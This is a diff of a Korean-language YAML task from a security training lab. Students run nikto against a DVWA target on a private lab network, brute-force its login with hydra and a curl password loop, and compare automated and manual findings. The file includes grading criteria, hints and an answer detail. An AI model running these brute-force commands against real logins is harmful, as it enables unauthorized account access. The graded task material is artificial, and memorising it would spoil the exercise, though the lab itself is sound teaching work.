+    \ | 권장 |\n| 속도 | 분 단위 | 시간 단위 | 자동 → 수동 |\n| 정확도 | 60-80% (FP) | 95%+ | 자동 후 수동\
+    \ 거르기 |\n| 우회 룰 | 약함 | 강함 | 수동 선호 |\n| 범위 | 전체 매핑 | 핵심 endpoint | 자동 정찰 + 수동 심층\
+    \ |\n\n[오탐 필터링]\n1. nikto Allowed Methods → 보통 FP\n2. nikto Server header → Medium\
+    \ 이지 Critical 아님\n3. ZAP X-Frame-Options → Medium\n4. hydra valid login → 응답 분석\
+    \ 후 FP 분리\n\n종료: echo \"=== Phase A nikto ===\" / \"=== Phase B hydra+curl ===\"\
+    \ / \"=== Phase C 매트릭스+오탐 ===\".\n\n\n[도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario`\
+    \ 에 적합한 도구: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구\
+    \ 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과."
+  hint: 'Phase A: nikto -maxtime 60. 오탐 가능 라인 명시.
 
-    ## 상황 (w12 → w13 시나리오 연속)
-
-    > 선배: "자동화 도구 주차. nikto·ZAP·hydra 자동 스캐너는 빠르지만 *오탐 천지*.
-    > 자동 후 수동 검증으로 거르는 게 핵심. 매트릭스 + 오탐 가이드."
-
-    학습 목표 (lecture 자동화 + 한계 + 오탐 필터) + (lab #2 hydra + #3 수동 브루트포스) 통합.
-
-    ## 임무 (3 단계, 약 35분)
-
-    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
-
-    ### Phase A — nikto 자동 스캔
-    `nikto -h http://10.20.30.80 -maxtime 60 -nointeractive 2>&1 | head -40`
-    발견 라인 + 오탐 가능 항목 (Allowed Methods, Server header) 명시.
-
-    ### Phase B — hydra 자동 + curl 수동 비교
-    1) hydra:
-       `echo -e "admin\nadministrator\nroot\nuser" > /tmp/users.txt`
-       `echo -e "password\nadmin\n123456\nadmin123\npassword123" > /tmp/pwds.txt`
-       `timeout 30 hydra -L /tmp/users.txt -P /tmp/pwds.txt 10.20.30.80 http-post-form
-        "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4 2>&1 | tail -10`
-    2) curl 수동:
-       `for pw in password admin 123456 admin123; do
-         echo -n "$pw: "; curl -s -o /dev/null -w "%{http_code} %{size_download}\n"
-         -X POST -d "username=admin&password=$pw" http://10.20.30.80/dvwa/login.php; done`
-
-    ### Phase C — 자동 vs 수동 매트릭스 + 오탐 가이드
-    | 측면 | 자동 (nikto/ZAP) | 수동 (curl/Burp) | 권장 |
-    | 속도 | 분 단위 | 시간 단위 | 자동 → 수동 |
-    | 정확도 | 60-80% (FP) | 95%+ | 자동 후 수동 거르기 |
-    | 우회 룰 | 약함 | 강함 | 수동 선호 |
-    | 범위 | 전체 매핑 | 핵심 endpoint | 자동 정찰 + 수동 심층 |
-
-    [오탐 필터링]
-    1. nikto Allowed Methods → 보통 FP
-    2. nikto Server header → Medium 이지 Critical 아님
-    3. ZAP X-Frame-Options → Medium
-    4. hydra valid login → 응답 분석 후 FP 분리
-
-    종료: echo "=== Phase A nikto ===" / "=== Phase B hydra+curl ===" / "=== Phase C 매트릭스+오탐 ===".
-  hint: |
-    Phase A: nikto -maxtime 60. 오탐 가능 라인 명시.
     Phase B: hydra timeout 30 + curl 응답 크기 비교.
+
     Phase C: 4행 매트릭스 + 4 오탐 가이드.
+
     포인트: 자동 한계 + 수동 검증.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -362,9 +454,11 @@ steps:
     expect: 매트릭스
     field: stdout
     semantic:
-      intent: |
-        nikto 자동 + hydra/curl 비교 + 자동 vs 수동 매트릭스 + 오탐 필터링.
+      intent: 'nikto 자동 + hydra/curl 비교 + 자동 vs 수동 매트릭스 + 오탐 필터링.
+
         lecture 전체 + lab #2·#3 동시 행동 증명.
+
+        '
       success_criteria:
       - Phase A — nikto 실행 + 오탐 가능 명시
       - Phase B — hydra 자동 + curl 수동 비교
@@ -381,6 +475,9 @@ steps:
       - 비교 관점 누락
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 직접. nikto/hydra 설치됨. DVWA 변동 시 JuiceShop login 으로 대체.
+  answer_detail: '학생이 ssh attacker 직접. nikto/hydra 설치됨. DVWA 변동 시 JuiceShop login
+    으로 대체.
+
     핵심은 자동 한계 + 수동 검증.
+
+    '
